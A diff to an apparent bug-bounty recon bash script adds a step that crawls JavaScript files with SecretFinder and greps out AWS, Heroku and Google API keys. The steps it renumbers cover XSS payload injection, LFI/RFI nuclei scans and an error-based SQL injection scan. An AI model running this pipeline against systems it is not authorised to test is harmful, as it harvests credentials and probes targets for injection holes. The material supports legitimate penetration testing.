@@ -53,14 +53,21 @@ python3 ~/tools/Corsy/corsy.py -i alivesubs > CorsyScan
 echo "[+] Step 6: Crawling Parameters and filtering them"
 cat alivesubs | gau --threads 5 | gouro > links
 
-echo "[+] Step 7: Filtering XSS parameters and Testing Target on XSS"
+echo "[+] Step 7: Filtering JS links and finding sensitive data in them"
+cat links | grep ".js$" > jsfiles.txt
+cat  jsfiles.txt | while read url; do python3 ~/tools/SecretFinder/SecretFinder.py -i $url -o cli >> secret.txt; done
+cat secret.txt | grep aws > awsapi.txt
+cat secret.txt | grep Heroku > herokuapi.txt
+cat secret.txt | grep google > googleapi.txt
+
+echo "[+] Step 8: Filtering XSS parameters and Testing Target on XSS"
 cat links | gf xss > xsslinks
 cat xsslinks | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln
 
-echo "[+] Step 8: Filtering LFI parameters and Testing Target on LFI/RFi/Data Traversal"
+echo "[+] Step 9: Filtering LFI parameters and Testing Target on LFI/RFi/Data Traversal"
 cat links | gf lfi > lfilinks
 nuclei -l lfilinks -tags lfi,rfi
 
-echo "[+] Step 9: SQLI Scan (niakos pativiscemit)"
+echo "[+] Step 10: SQLI Scan (niakos pativiscemit)"
 cat links | gf sqli > sqlilinks
 python3 Resources/ErrorBasedSqli.py
